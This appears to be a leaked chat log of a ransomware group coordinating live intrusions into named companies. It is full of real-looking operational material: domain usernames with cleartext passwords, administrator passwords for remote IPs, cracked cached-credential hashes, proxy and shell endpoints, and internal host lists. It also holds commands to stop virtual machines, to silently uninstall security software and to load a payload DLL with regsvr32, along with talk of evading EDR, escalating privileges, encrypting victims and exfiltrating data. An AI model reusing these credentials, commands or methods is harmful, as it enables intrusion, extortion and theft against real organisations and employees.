@@ -1,0 +1,1673 @@
+[2023-12-17 06:26:29] @usernamenn:matrix.bestflowers247.online: > <@usernamegg:matrix.bestflowers247.online> water, flyt, hyundai, ontex
+
+?
+--------------------
+[2023-12-17 06:27:36] @usernamenn:matrix.bestflowers247.online: > <@cob_crypt_ward:matrix.bestflowers247.online> глянул, там побольше фильтров будет + DNS с TCP. эта штука покруче редгуарда точно будет
+
+отлично, научись ее настраивать тогда и будем ее юзать лучше
+--------------------
+[2023-12-17 06:27:42] @usernamenn:matrix.bestflowers247.online: будет круто
+--------------------
+[2023-12-17 06:28:13] @usernamenn:matrix.bestflowers247.online: это очередь
+--------------------
+[2023-12-17 06:31:51] @usernamemm:matrix.bestflowers247.online: `51.222.194.213:39681`
+--------------------
+[2023-12-17 06:32:08] @usernamenn:matrix.bestflowers247.online: Привет всем!
+--------------------
+[2023-12-17 06:32:15] @usernamett:matrix.bestflowers247.online: ```
+51.222.194.213:41071
+51.222.194.213:41463
+51.222.194.213:46557
+51.222.194.213:46557
+```
+--------------------
+[2023-12-17 06:32:15] @usernamezz:matrix.bestflowers247.online: hi
+--------------------
+[2023-12-17 06:32:17] @usernameww:matrix.bestflowers247.online: Hi
+--------------------
+[2023-12-17 06:32:21] @usernamecc:matrix.bestflowers247.online: hi
+--------------------
+[2023-12-17 06:32:23] @usernamemm:matrix.bestflowers247.online: хай
+--------------------
+[2023-12-17 06:32:30] @usernamett:matrix.bestflowers247.online: Hi
+--------------------
+[2023-12-17 06:34:20] @usernamett:matrix.bestflowers247.online: 51.222.194.213:40049
+--------------------
+[2023-12-17 06:35:06] @usernamegg:matrix.bestflowers247.online: хорошо, надо распланировать кто какой в очереди.
+--------------------
+[2023-12-17 06:40:09] @usernamett:matrix.bestflowers247.online: 
+```
+Powershell Get-VM
+Powershell Stop-VM -Name 'ED6TEL1P' –TurnOff
+```
+
+--------------------
+[2023-12-17 06:54:13] @usernamett:matrix.bestflowers247.online: SAZU-PIVIS01   НЕ СТОПАТЬ !!!
+--------------------
+[2023-12-17 06:57:55] @usernamecc:matrix.bestflowers247.online: image.png
+--------------------
+[2023-12-17 06:59:54] @usernamegg:matrix.bestflowers247.online: Снимок экрана 2023-12-17 в 09.59.15.png
+--------------------
+[2023-12-17 07:02:18] @usernamett:matrix.bestflowers247.online: 51.222.194.213:45321
+51.222.194.213:44869
+51.222.194.213:35759
+--------------------
+[2023-12-17 07:02:31] @usernamett:matrix.bestflowers247.online: * SAZU-PIVIS01   НЕ СТОПАТЬ !!!
+SEXPA14
+--------------------
+[2023-12-17 07:28:21] @usernamess:matrix.bestflowers247.online: ```
+ADMINDM
+SRV-SCCMMP.AGCNA.NET
+
+SOLARWINDS2@AGCNA.NET
+SRV-SOLARWINDS.AGCNA.NET
+SRV-SW-POLLER1.AGCNA.NET
+
+ADMINJEN
+SRV-RDSHA.AGCNA.NET
+SDFVA-BACKUP1.AGCNA.NET
+SRV-SHAREGATE01.AGCNA.NET
+SRV-RDSDM.AGCNA.NET
+
+OMAA
+SETKY-MEC.AGC.JP
+
+SERVICEACRONIS
+EL3_KSBM_PSM1.AGCNA.NET
+EL5_BY_LD.AGCNA.NET
+ETP4_MMC1.AGCNA.NET
+EL2_BYLINE.AGCNA.NET
+ETP4_MMC2.AGCNA.NET
+EL3_KSBM_PSM2.AGCNA.NET
+ETP4_VSM1.AGCNA.NET
+EL3_BYLINE.AGCNA.NET
+BEL-D-BTP6MNTPN.AGCNA.NET
+EL5_KSBM_PSM1.AGCNA.NET
+ETP4_MMC3.AGCNA.NET
+ETP4_VSM2.AGCNA.NET
+ELA1_PREPRESS.AGCNA.NET
+SRV-DFSFILE01.AGCNA.NET
+
+ADMINTB
+SRV-DFSFILE01.AGCNA.NET
+SCTCA5.AGCNA.NET
+SRV-KRONOSTEST1.AGCNA.NET
+CSO-V-TGBRANSON.AGCNA.NET
+SRV-EXCH2.AGCNA.NET
+SETKY-FILE02.AGCNA.NET
+SRV-HYPERV01.AGCNA.NET
+
+ADMINBMW
+SFHMI-ITMGT2.AGC.JP
+SRV-SCCMMP.AGCNA.NET
+```
+--------------------
+[2023-12-17 07:41:24] @usernamess:matrix.bestflowers247.online: 10.6.5.35
+172.23.7.70
+
+--------------------
+[2023-12-17 07:57:04] @usernamett:matrix.bestflowers247.online: ```
+51.222.194.213:45321
+51.222.194.213:44869
+51.222.194.213:35759
+51.222.194.213:40049
+```
+
+--------------------
+[2023-12-17 08:00:35] @usernamess:matrix.bestflowers247.online: 5d0c6439b8d3351f950495dfbbaa319a
+--------------------
+[2023-12-17 08:00:56] @usernamecc:matrix.bestflowers247.online: SEXPA25
+--------------------
+[2023-12-17 08:03:42] @usernamett:matrix.bestflowers247.online: 
+```
+НЕ СТОПАТЬ !!!
+
+SAZU-PIVIS01
+SEXPA14
+SEXPA25
+```
+--------------------
+[2023-12-17 08:17:12] @usernamess:matrix.bestflowers247.online: 62b19ebc29de560fa762cda06a51e11c
+425f6eca225d8ee31880c03b369e47a0
+7714031b75defd8eb30f6d00910c6a9e
+dd2a1b9991f70a29248d036f10b8e7b2
+--------------------
+[2023-12-17 08:20:32] @usernamess:matrix.bestflowers247.online: fa682d3a7caecb2b2fd1bc065f38b9e8
+c4e33c527a585d54e069a0c69adcd2d2
+2c965d7134891b596f6e3172c545861f
+--------------------
+[2023-12-17 08:27:47] @usernamess:matrix.bestflowers247.online: 51.222.194.213:39645
+--------------------
+[2023-12-17 08:28:02] @usernamess:matrix.bestflowers247.online: 10.2.5.11
+10.6.5.175
+10.70.1.21
+10.6.5.76
+10.11.0.136
+10.6.5.45
+10.8.5.107
+10.7.5.10
+10.64.5.57
+10.2.5.5
+10.9.39.19
+10.68.214.8
+10.6.5.119
+10.6.5.172
+10.64.5.22
+10.7.5.8
+10.8.5.14
+10.7.117.19
+10.9.39.7
+10.5.5.7
+10.6.5.138
+10.8.5.229
+10.68.207.8
+10.68.207.19
+10.70.1.203
+10.68.207.82
+10.64.5.24
+10.68.207.24
+10.2.5.58
+10.68.180.56
+10.8.5.217
+10.64.5.46
+
+--------------------
+[2023-12-17 08:28:09] @usernamess:matrix.bestflowers247.online: Administrator !AWseB3
+--------------------
+[2023-12-17 08:28:59] @usernamess:matrix.bestflowers247.online: ```
+2c0b9fa97fcbc49052701933f21f4273
+acdc79b34de42eba67185c42854d7cc1
+04111249b8f5545cd2696e56787d1c34
+```
+--------------------
+[2023-12-17 08:42:10] @cob_crypt_ward:matrix.bestflowers247.online: да, делаю, пытаюсь фиксить
+--------------------
+[2023-12-17 08:42:31] @cob_crypt_ward:matrix.bestflowers247.online: сегодня еще попробую поставить BounceBack
+--------------------
+[2023-12-17 08:52:15] @usernamenn:matrix.bestflowers247.online: aa46657626fceebfdecfa7f2e76d064b
+aa46657626fceebfdecfa7f2e76d064b
+--------------------
+[2023-12-17 08:52:44] @usernamenn:matrix.bestflowers247.online: * ```
+aa46657626fceebfdecfa7f2e76d064b
+0373c38177212c4b65d33730b3406107
+```
+--------------------
+[2023-12-17 08:55:02] @usernamess:matrix.bestflowers247.online: ```
+agc.jp\B183AUZPZMAD PAss_w0rd!_Str0nG!
+
+agc.jp\takasi.moriwaki PAss_w0rd!_Str0nG!
+```
+--------------------
+[2023-12-17 09:07:17] @usernamenn:matrix.bestflowers247.online: SharpSecDump палится, особенно на ДЦ
+
+Ситуация такая, я получил другого траста доменного, одел его, и сделал попыпку SharpSecDump, на дц стояли какие то правила что нельзя короче с регистра снимать sam security save, ну меня нахуй послало короче типа нельзя снимать. Ну я не стал прыгать на эти ДЦ понимая что там не долбаебы и попытка прыжка туда даже криптованным будет плачевной. Как итог на сегодня PDC в оффлайне в трасте, а чела под которым делал попытку SharpSecDump неактивен.
+--------------------
+[2023-12-17 09:08:13] @usernamenn:matrix.bestflowers247.online: SharpSecDump палится он не такой безобидный как кажется
+--------------------
+[2023-12-17 09:17:10] @usernamess:matrix.bestflowers247.online: msiexec.exe /x {940590BF-593E-418B-809D-F48EA0EC751E} /norestart /qn
+--------------------
+[2023-12-17 09:37:07] @usernamess:matrix.bestflowers247.online: 5c850165a2cd872e203d907437a21202
+--------------------
+[2023-12-17 09:38:35] @usernamess:matrix.bestflowers247.online: 782262621cf01c844da92b6939c87493
+--------------------
+[2023-12-17 09:40:50] @usernamett:matrix.bestflowers247.online: 
+```
+НЕ СТОПАТЬ !!!
+
+SAZU-PIVIS01
+SEXPA14
+SEXPA25
+```
+--------------------
+[2023-12-17 09:53:07] @usernamett:matrix.bestflowers247.online: ```
+51.222.194.213:44869
+51.222.194.213:45321
+```
+--------------------
+[2023-12-17 09:56:38] @usernamett:matrix.bestflowers247.online: * ```
+НЕ СТОПАТЬ !!!
+
+SAZU-PIVIS01
+SEXPA14
+SEXPA25
+WDAGCEDIAPP00
+```
+--------------------
+[2023-12-17 09:59:36] @usernamess:matrix.bestflowers247.online: ```
+Malevolent-2023
+Cucurigu123###
+I$la0w3n1!
+Domino0318!
+Friday#33
+Legacy2004?
+Friday#15
+Thursday148
+Paradox42!
+```
+--------------------
+[2023-12-17 10:01:08] @usernamenn:matrix.bestflowers247.online: желтая полоска на все ебало
+--------------------
+[2023-12-17 10:01:28] @usernamenn:matrix.bestflowers247.online: X 2023-12-17 в 13.03.11.jpg
+--------------------
+[2023-12-17 10:04:19] @usernamett:matrix.bestflowers247.online: ```
+AGCNA\ JP
+
+
+51.222.194.213:40765
+51.222.194.213:44197
+51.222.194.213:36091
+51.222.194.213:37907
+```
+--------------------
+[2023-12-17 10:13:34] @usernameyy:matrix.bestflowers247.online: а что в итоге с био случилось?
+--------------------
+[2023-12-17 10:13:35] @usernameyy:matrix.bestflowers247.online: привет
+--------------------
+[2023-12-17 10:13:45] @usernamegg:matrix.bestflowers247.online: не знаю
+--------------------
+[2023-12-17 10:13:47] @usernamegg:matrix.bestflowers247.online: пропал парень
+--------------------
+[2023-12-17 10:13:51] @usernamegg:matrix.bestflowers247.online: ни кто не знает
+--------------------
+[2023-12-17 10:13:55] @usernamegg:matrix.bestflowers247.online: даже его близкие
+--------------------
+[2023-12-17 10:14:04] @usernamegg:matrix.bestflowers247.online: а что ты так вспомнил?
+--------------------
+[2023-12-17 10:14:16] @usernameyy:matrix.bestflowers247.online: да просто, давно его не видел
+--------------------
+[2023-12-17 10:14:19] @usernameyy:matrix.bestflowers247.online: странно
+--------------------
+[2023-12-17 10:17:57] @usernamess:matrix.bestflowers247.online: 
+```
+agc.jp\B183AUZPZMAD PAss_w0rd!_Str0nG!
+agc.jp\takasi.moriwaki PAss_w0rd!_Str0nG!
+agc.jp\CZ104747 PAss_w0rd!_Str0nG!
+agc.jp\BE92678 PAss_w0rd!_Str0nG!
+agc.jp\C421036 PAss_w0rd!_Str0nG!
+agc.jp\C421042 PAss_w0rd!_Str0nG!
+agc.jp\SVC-VCENTER PAss_w0rd!_Str0nG!
+
+agc.jp\MARK.BEHNE PAss_w0rd!_Str0nG!
+
+agc.jp\JVILLASENOR PAss_w0rd!_Str0nG!
+agc.jp\BE11450 PAss_w0rd!_Str0nG!
+add_user B183AUZPZMAD PAss_w0rd!_Str0nG!
+CDB180\gcadminsc Friday#33
+agc.jp\GCAdminBES Cucurigu123###
+agc.jp\GCADMINFD I$la0w3n1!
+agc.jp\JVILLASENOR Domino0318!
+```
+--------------------
+[2023-12-17 10:19:36] @usernameyy:matrix.bestflowers247.online: > <@usernamegg:matrix.bestflowers247.online> оплатил
+
+и по поводу этого надо решить
+--------------------
+[2023-12-17 10:19:42] @usernameyy:matrix.bestflowers247.online: мне нужна айди транзы
+--------------------
+[2023-12-17 10:23:11] @usernameyy:matrix.bestflowers247.online: 178.236.246.147 ддосят похоже нашу прокладку к ftp9_3, оч долго грузится
+--------------------
+[2023-12-17 10:24:06] @usernamegg:matrix.bestflowers247.online: хм
+--------------------
+[2023-12-17 10:25:07] @usernameyy:matrix.bestflowers247.online: дай айди транзы или мы платим еще раз, 2 дня осталось
+--------------------
+[2023-12-17 10:26:50] @usernamegg:matrix.bestflowers247.online: другой кошель давай
+--------------------
+[2023-12-17 10:26:56] @usernamegg:matrix.bestflowers247.online: там я напутал и отправил себе же на другой
+--------------------
+[2023-12-17 10:27:03] @usernamegg:matrix.bestflowers247.online: жду
+--------------------
+[2023-12-17 10:27:35] @usernameyy:matrix.bestflowers247.online: ну хорошо хоть не в пустоту) https://pay.freekassa.ru/crypto/117159464/9056c9d204383cb0de8248136ecc2602
+--------------------
+[2023-12-17 10:27:42] @usernameyy:matrix.bestflowers247.online: вот так буду кидать, удобно?
+--------------------
+[2023-12-17 10:27:45] @usernamegg:matrix.bestflowers247.online: USDT есть ?
+erc20
+--------------------
+[2023-12-17 10:27:52] @usernamegg:matrix.bestflowers247.online: кошель давай
+--------------------
+[2023-12-17 10:28:36] @usernamegg:matrix.bestflowers247.online: да
+--------------------
+[2023-12-17 10:28:38] @usernamegg:matrix.bestflowers247.online: очень
+--------------------
+[2023-12-17 10:28:38] @usernamegg:matrix.bestflowers247.online: https://etherscan.io/tx/0xf9c6631fa423d51dab8cc32defa67e4e37a91dcf2fcb6693194039e356a6d9f8
+--------------------
+[2023-12-17 10:28:58] @usernamegg:matrix.bestflowers247.online: оплатил
+--------------------
+[2023-12-17 10:31:04] @usernamegg:matrix.bestflowers247.online: $DCC2$10240#cbirck#97e4304fe1bbde4ea1b372f358f5ea2e:coff337887
+--------------------
+[2023-12-17 10:39:07] @username777:matrix.bestflowers247.online: Привет . зачем ?
+--------------------
+[2023-12-17 10:39:19] @usernamegg:matrix.bestflowers247.online: для оплаты
+--------------------
+[2023-12-17 10:39:28] @username777:matrix.bestflowers247.online: Все оплачено
+--------------------
+[2023-12-17 10:39:54] @usernamegg:matrix.bestflowers247.online: хорошо
+--------------------
+[2023-12-17 10:39:57] @username777:matrix.bestflowers247.online: ++
+--------------------
+[2023-12-17 10:43:06] @usernamecc:matrix.bestflowers247.online: image.png
+--------------------
+[2023-12-17 10:43:37] @usernamess:matrix.bestflowers247.online: agc.jp\ATOPER PAss_w0rd!_Str0nG!
+--------------------
+[2023-12-17 10:43:42] @usernamess:matrix.bestflowers247.online: * `agc.jp\ATOPER PAss_w0rd!_Str0nG!`
+--------------------
+[2023-12-17 10:51:02] @usernamenn:matrix.bestflowers247.online: ```
+HYUNDAI.EUCORP.LOCAL/hbea0001:$DCC2$10240#hbea0001#65dac22dd10f6c04d2f57650b5963e2b
+HYUNDAI.EUCORP.LOCAL/haea0263:$DCC2$10240#haea0263#361d001e8aeba70d7b1435269390c25f
+```
+
+**Possible passwords:**
+
+```
+RDit182329!
+Hmetc2022!
+Sem18per26!
+schweinerei
+Commander2008!
+```
+--------------------
+[2023-12-17 10:51:47] @username777:matrix.bestflowers247.online: $DCC2$10240#hbea0001#65dac22dd10f6c04d2f57650b5963e2b:6,Abcde.
+
+--------------------
+[2023-12-17 10:53:05] @usernamegg:matrix.bestflowers247.online: 36 локнули
+--------------------
+[2023-12-17 10:53:11] @usernamegg:matrix.bestflowers247.online: ты без прокладки сделал ее ?
+--------------------
+[2023-12-17 10:56:55] @usernamess:matrix.bestflowers247.online: ```
+agc.jp\B180AAZVM PAss_w0rd!_Str0nG!
+agc.jp\LORDA PAss_w0rd!_Str0nG!
+agc.jp\DOMENIC.MEDURE PAss_w0rd!_Str0nG!
+agc.jp\DILLION.BAUMGARDNER PAss_w0rd!_Str0nG!
+agc.jp\BRANDON.ZULKA PAss_w0rd!_Str0nG!
+agc.jp\JONATHON.CARROLL PAss_w0rd!_Str0nG!
+agc.jp\JOHN.CANNON PAss_w0rd!_Str0nG!
+agc.jp\BRITTANY.WILLIAMS PAss_w0rd!_Str0nG!
+agc.jp\AGCBACKUP PAss_w0rd!_Str0nG!
+```
+--------------------
+[2023-12-17 10:58:38] @usernamett:matrix.bestflowers247.online: ```
+51.222.194.213:44869
+51.222.194.213:45321
+```
+--------------------
+[2023-12-17 10:58:50] @usernamett:matrix.bestflowers247.online: 51.222.194.213:37907  JP
+--------------------
+[2023-12-17 11:00:13] @usernamett:matrix.bestflowers247.online: ```
+AGCNA
+
+51.222.194.213:38971
+51.222.194.213:36025
+```
+--------------------
+[2023-12-17 11:00:26] @usernamenn:matrix.bestflowers247.online: HYUNDAI - наточили косы, хотя тихо двигался, двигаюсь дальше по тихой
+--------------------
+[2023-12-17 11:00:37] @usernamegg:matrix.bestflowers247.online: добрый
+--------------------
+[2023-12-17 11:00:42] @usernamenn:matrix.bestflowers247.online: Здарова
+--------------------
+[2023-12-17 11:00:54] @usernamegg:matrix.bestflowers247.online: что там накатывают ?
+--------------------
+[2023-12-17 11:01:02] @usernamenn:matrix.bestflowers247.online: xagt
+--------------------
+[2023-12-17 11:01:22] @usernamegg:matrix.bestflowers247.online: с прокладка ontex что там у тебя ?
+--------------------
+[2023-12-17 11:01:46] @usernamegg:matrix.bestflowers247.online: япошек сейчас лочим и чутка надо выдохнуть
+--------------------
+[2023-12-17 11:01:51] @usernamenn:matrix.bestflowers247.online: ONTEX - там очень медленный DNS и движений вобще по нулям кроме центра сертификации, но что бы мне ебануть MITM нужно подгрузить драйвер, я там на 5 тачках только вишу и больше движений нет. Драйвер не подгружается ни на одной тачке не ебу что такое.
+--------------------
+[2023-12-17 11:01:53] @usernamegg:matrix.bestflowers247.online: что бы понимать как координировать наши действия
+--------------------
+[2023-12-17 11:02:08] @usernamenn:matrix.bestflowers247.online: Ебусь короче плотно с двумя сетками, точнее плотно с ONTEX
+--------------------
+[2023-12-17 11:02:19] @usernamegg:matrix.bestflowers247.online: на порт не позвать прокладки ?
+--------------------
+[2023-12-17 11:02:21] @usernamenn:matrix.bestflowers247.online: с HYUNDAI там движений дохуя, главное бы не выпилили
+--------------------
+[2023-12-17 11:02:30] @usernamenn:matrix.bestflowers247.online: > <@usernamegg:matrix.bestflowers247.online> на порт не позвать прокладки ?
+
+нет пробовал всяко разно
+--------------------
+[2023-12-17 11:02:31] @usernamegg:matrix.bestflowers247.online: там же есть сейчас хорошие файлы у ZZ от нового криптера
+--------------------
+[2023-12-17 11:02:43] @usernamenn:matrix.bestflowers247.online: не в файле проблема, инета 0
+--------------------
+[2023-12-17 11:02:51] @usernamegg:matrix.bestflowers247.online: аа
+--------------------
+[2023-12-17 11:03:04] @usernamenn:matrix.bestflowers247.online: FLYT я проверил и протестировал на лабе PSRemote
+--------------------
+[2023-12-17 11:03:16] @usernamegg:matrix.bestflowers247.online: и как ?
+--------------------
+[2023-12-17 11:03:25] @usernamenn:matrix.bestflowers247.online: там одному только челу можем поменять пароль который имеет подключение по winrm на DC через PSRemote
+--------------------
+[2023-12-17 11:03:35] @usernamenn:matrix.bestflowers247.online: PSRemote я протестировал консоль удаленно получил
+--------------------
+[2023-12-17 11:03:42] @usernamenn:matrix.bestflowers247.online: осталось реализовать это на FLYT
+--------------------
+[2023-12-17 11:04:09] @usernamegg:matrix.bestflowers247.online: на лабе все получилось, значит не зря вчера поднимали сервр новый и лабу ставил $$
+--------------------
+[2023-12-17 11:04:12] @usernamenn:matrix.bestflowers247.online: но прямая консоль от чела которому поменяем пароль в FLYT не даст нам сессию от системы или админа, потому что он просто юзер я так понял и не факт что локальный админ на ДЦ
+--------------------
+[2023-12-17 11:04:21] @usernamegg:matrix.bestflowers247.online: отлично
+--------------------
+[2023-12-17 11:04:25] @usernamenn:matrix.bestflowers247.online: получится позвать скорее всего саму ДЦ если повезет
+--------------------
+[2023-12-17 11:04:31] @usernamenn:matrix.bestflowers247.online: и придется LPE шить ее
+--------------------
+[2023-12-17 11:04:33] @usernamenn:matrix.bestflowers247.online: иначе никак
+--------------------
+[2023-12-17 11:04:33] @usernamegg:matrix.bestflowers247.online: повезет
+--------------------
+[2023-12-17 11:04:37] @usernamegg:matrix.bestflowers247.online: уже повезло что ты там )
+--------------------
+[2023-12-17 11:04:40] @usernamenn:matrix.bestflowers247.online: пасс сменим, прыгнем если повезет
+--------------------
+[2023-12-17 11:04:48] @usernamenn:matrix.bestflowers247.online: и если сойдуться звезды LPE получится))
+--------------------
+[2023-12-17 11:04:52] @usernamenn:matrix.bestflowers247.online: короче пиздец как все шатко
+--------------------
+[2023-12-17 11:04:56] @usernamegg:matrix.bestflowers247.online: мы завтра до вечера уедем по домам
+--------------------
+[2023-12-17 11:05:06] @usernamegg:matrix.bestflowers247.online: отдыхнуть надо
+--------------------
+[2023-12-17 11:05:11] @usernamegg:matrix.bestflowers247.online: потом продолжим
+--------------------
+[2023-12-17 11:05:15] @usernamegg:matrix.bestflowers247.online: они выебались
+--------------------
+[2023-12-17 11:05:20] @usernamegg:matrix.bestflowers247.online: кто то уже с температурой тут
+--------------------
+[2023-12-17 11:05:22] @usernamenn:matrix.bestflowers247.online: > <@usernamegg:matrix.bestflowers247.online> на лабе все получилось, значит не зря вчера поднимали сервр новый и лабу ставил $$
+
+не зря, я просил лабу только пока что для того что бы проверить как работает удаленная консоль через winrm
+--------------------
+[2023-12-17 11:05:29] @usernamegg:matrix.bestflowers247.online: надо назначить все с флайтом
+--------------------
+[2023-12-17 11:05:34] @usernamenn:matrix.bestflowers247.online: > <@usernamegg:matrix.bestflowers247.online> кто то уже с температурой тут
+
+пиздец
+--------------------
+[2023-12-17 11:05:44] @usernamegg:matrix.bestflowers247.online: * надо назначить время с флайтом
+--------------------
+[2023-12-17 11:05:52] @usernamegg:matrix.bestflowers247.online: они без продыха ну
+--------------------
+[2023-12-17 11:06:02] @usernamenn:matrix.bestflowers247.online: с флайтом продолжим с SS, сменим пасс скорее всего хули либо отложить на след раз
+--------------------
+[2023-12-17 11:06:09] @usernamenn:matrix.bestflowers247.online: > <@usernamegg:matrix.bestflowers247.online> они без продыха ну
+
+да я понимаю
+--------------------
+[2023-12-17 11:06:46] @usernamegg:matrix.bestflowers247.online: если смени пасс ни кто домой не поедет
+--------------------
+[2023-12-17 11:06:51] @usernamegg:matrix.bestflowers247.online: будем ставить
+--------------------
+[2023-12-17 11:07:13] @usernamegg:matrix.bestflowers247.online: и потом лочить их
+--------------------
+[2023-12-17 11:07:20] @usernamegg:matrix.bestflowers247.online: даты надо больше выкачивать по таким сеткам
+--------------------
+[2023-12-17 11:07:26] @usernamegg:matrix.bestflowers247.online: уже бы качать начинать конечно
+--------------------
+[2023-12-17 11:07:30] @usernamegg:matrix.bestflowers247.online: если не палево
+--------------------
+[2023-12-17 11:08:54] @usernamett:matrix.bestflowers247.online: 
+```
+AGCNA\ JP  new socks
+
+51.222.194.213:44705
+51.222.194.213:39983
+```
+--------------------
+[2023-12-17 11:10:30] @usernamenn:matrix.bestflowers247.online: что бы качать нужен доменной =)
+--------------------
+[2023-12-17 11:11:16] @usernamenn:matrix.bestflowers247.online: что то нынче хуево крутятся сетки ))
+--------------------
+[2023-12-17 11:11:27] @usernamenn:matrix.bestflowers247.online: даже при условии что через цитрикс доступ
+--------------------
+[2023-12-17 11:11:34] @usernamegg:matrix.bestflowers247.online: сложные сетки с таких доступов это же не со спама
+--------------------
+[2023-12-17 11:14:09] @usernamenn:matrix.bestflowers247.online: я только не понимаю разницу, какая разница между спамом сетки и такими
+--------------------
+[2023-12-17 11:14:16] @usernamenn:matrix.bestflowers247.online: тоже самое же
+--------------------
+[2023-12-17 11:17:09] @usernamegg:matrix.bestflowers247.online: ну со спама точка входа легче
+--------------------
+[2023-12-17 11:17:20] @usernamegg:matrix.bestflowers247.online: значит админы не так настроили сеть сложно
+--------------------
+[2023-12-17 11:17:32] @usernamegg:matrix.bestflowers247.online: а значит и движения должно быть больше
+--------------------
+[2023-12-17 11:17:44] @usernamegg:matrix.bestflowers247.online: ну это только логика моя
+--------------------
+[2023-12-17 11:21:38] @usernamess:matrix.bestflowers247.online: ```
+Using domain name: agc.jp
+Using dc name: T183DCZPJPAD07
+Using password: PAss_w0rd!_Str0nG!
+```
+--------------------
+[2023-12-17 11:21:41] @usernamess:matrix.bestflowers247.online: 🐗
+--------------------
+[2023-12-17 11:31:20] @usernamenn:matrix.bestflowers247.online: > <@usernamegg:matrix.bestflowers247.online> значит админы не так настроили сеть сложно
+
+да возомжно
+--------------------
+[2023-12-17 11:31:32] @usernamenn:matrix.bestflowers247.online: да это правильная логика я наверно тоже к этому же склоняюсь
+--------------------
+[2023-12-17 11:54:55] @cameron777:matrix.org: privet vsem
+--------------------
+[2023-12-17 11:55:08] @usernamess:matrix.bestflowers247.online: Привет!
+--------------------
+[2023-12-17 12:00:35] @cameron777:matrix.org: https://www.zoominfo.com/c/barrack-rodos--bacine/3998523
+
+Barrack Rodos & Bacine
+
+Law Firms & Legal Services · Pennsylvania, United States · 63 Employees
+
+Barrack, Rodos & Bacine is a highly experienced securities litigation firm with offices in Philadelphia, PA, New York City, NY, and San Diego, CA. During its more than 40 years in practice, BR&B has recovered over ten billion dollars on behalf of victims of corpora
+
+Revenue
+$15.9M
+Industry
+
+Industry
+Law Firms & Legal Services
+
+
+```
+Bot ID	BRBWRK1_zwashington_59C9127F
+IP | Country	50.238.167.2 | US
+Domain | Hosts	barrack.com
+
+
+Shell 13.57.243.97:18869
+Socks 13.57.243.97:13028
+FTP   13.57.243.97:15597
+
+Antivirus Processes (2)
+SentinelOne
+SentinelOne Singularity XDR
+```
+--------------------
+[2023-12-17 12:00:47] @cameron777:matrix.org: shas vidam citrix esho
+--------------------
+[2023-12-17 12:03:12] @cameron777:matrix.org: citrix zakrivaetsya poka nado tak robotat' no tam SentinelOne nado bit'  ostorozhnim
+--------------------
+[2023-12-17 12:15:55] @usernamejj:matrix.bestflowers247.online: > <@cameron777:matrix.org> https://www.zoominfo.com/c/barrack-rodos--bacine/3998523
+>
+> Barrack Rodos & Bacine
+>
+> Law Firms & Legal Services · Pennsylvania, United States · 63 Employees
+>
+> Barrack, Rodos & Bacine is a highly experienced securities litigation firm with offices in Philadelphia, PA, New York City, NY, and San Diego, CA. During its more than 40 years in practice, BR&B has recovered over ten billion dollars on behalf of victims of corpora
+>
+> Revenue
+> $15.9M
+> Industry
+>
+> Industry
+> Law Firms & Legal Services
+>
+>
+> ```
+> Bot ID	BRBWRK1_zwashington_59C9127F
+> IP | Country	50.238.167.2 | US
+> Domain | Hosts	barrack.com
+>
+>
+> Shell 13.57.243.97:18869
+> Socks 13.57.243.97:13028
+> FTP   13.57.243.97:15597
+>
+> Antivirus Processes (2)
+> SentinelOne
+> SentinelOne Singularity XDR
+> ```
+
+++
+--------------------
+[2023-12-17 12:24:39] @usernamejj:matrix.bestflowers247.online: > <@cameron777:matrix.org> https://www.zoominfo.com/c/barrack-rodos--bacine/3998523
+>
+> Barrack Rodos & Bacine
+>
+> Law Firms & Legal Services · Pennsylvania, United States · 63 Employees
+>
+> Barrack, Rodos & Bacine is a highly experienced securities litigation firm with offices in Philadelphia, PA, New York City, NY, and San Diego, CA. During its more than 40 years in practice, BR&B has recovered over ten billion dollars on behalf of victims of corpora
+>
+> Revenue
+> $15.9M
+> Industry
+>
+> Industry
+> Law Firms & Legal Services
+>
+>
+> ```
+> Bot ID	BRBWRK1_zwashington_59C9127F
+> IP | Country	50.238.167.2 | US
+> Domain | Hosts	barrack.com
+>
+>
+> Shell 13.57.243.97:18869
+> Socks 13.57.243.97:13028
+> FTP   13.57.243.97:15597
+>
+> Antivirus Processes (2)
+> SentinelOne
+> SentinelOne Singularity XDR
+> ```
+
+пришел в кобу и сразу отъехал; shell, ftp также следом
+--------------------
+[2023-12-17 12:25:20] @cameron777:matrix.org: sec
+--------------------
+[2023-12-17 12:26:38] @cameron777:matrix.org: kakoy to logindata tam file
+--------------------
+[2023-12-17 12:26:41] @cameron777:matrix.org: nado ?
+--------------------
+[2023-12-17 12:26:56] @usernamejj:matrix.bestflowers247.online: давай
+--------------------
+[2023-12-17 12:27:34] @cob_crypt_ward:matrix.bestflowers247.online: кстати, хотел спросить, не вариант через smb перекидывать dll на удаленную машину, а потом через remote-exec выполнять ее?
+--------------------
+[2023-12-17 12:27:59] @cob_crypt_ward:matrix.bestflowers247.online: или вам нужно все то же самое, только одной командой?
+--------------------
+[2023-12-17 12:28:06] @cameron777:matrix.org: 13.52.211.166
+Administrator
+;x$qwr3M%qgv7hDDXkykoN47G).6w1v!
+--------------------
+[2023-12-17 12:28:07] @cameron777:matrix.org: zaxodi
+--------------------
+[2023-12-17 12:28:53] @cameron777:matrix.org: FusionEcho.exe
+--------------------
+[2023-12-17 12:29:08] @cameron777:matrix.org: regsvr32 /s FusionEcho.dll
+
+--------------------
+[2023-12-17 12:29:11] @cameron777:matrix.org: novi
+--------------------
+[2023-12-17 12:29:20] @usernamejj:matrix.bestflowers247.online: ++
+--------------------
+[2023-12-17 12:32:31] @cameron777:matrix.org: privet
+--------------------
+[2023-12-17 12:36:04] @cameron777:matrix.org: > <@usernamejj:matrix.bestflowers247.online> ++
+
+stuknulo
+no tam otrubit esho raz esli chto to gryazno uvidit
+esli est' kakoy to dll mozhno probnut'
+no lutche cherez citrix zapuskay poka chto
+--------------------
+[2023-12-17 12:36:26] @usernamejj:matrix.bestflowers247.online: ok
+--------------------
+[2023-12-17 12:45:26] @cameron777:matrix.org: 18.134.6.74
+Administrator
+-!lQ9&sxDlmv3x3txAo!d!P&=.ymw4qu
+
+```
+Liste des approbations de domaine :
+0: SIKA sika.com (NT 5) (Direct Outbound) (Direct Inbound) ( Attr: 0x8 )
+1: PAREXGROUP parexgroup.local (NT 5) (Forest Tree Root) (Primary Domain) (Native)
+La commande a été correctement exécutée
+```
+--------------------
+[2023-12-17 12:47:08] @cameron777:matrix.org: nado probit' vozmozhno eti
+
+```
+https://www.zoominfo.com/c/sika-ag/34963667
+
+Website
+www.sika.com
+Sika Revenue
+
+Revenue
+$9.7B
+Stock Symbol
+
+Stock Symbol
+SIK
+Industry
+
+Industry
+Commercial & Residential Construction
+Construction
+
